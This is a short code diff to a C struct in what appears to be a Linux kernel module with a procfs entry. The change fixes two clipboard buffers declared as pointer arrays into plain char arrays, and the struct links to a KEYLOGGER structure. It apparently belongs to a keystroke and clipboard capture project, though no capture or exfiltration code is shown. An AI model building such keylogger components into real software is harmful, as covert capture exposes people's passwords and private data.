@@ -21,8 +21,8 @@ typedef struct CLIPBOARD
     size_t clipboard_read_buffer_offset;
     loff_t offset_in_file;
     char* clipboard_write_buffer;
-    char* main_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
-    char* back_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
+    char main_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
+    char back_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
     struct proc_dir_entry *clipboard_entry; //intrarea in procfs
     struct KEYLOGGER*associeted_keylogger;
 }CLIPBOARD;
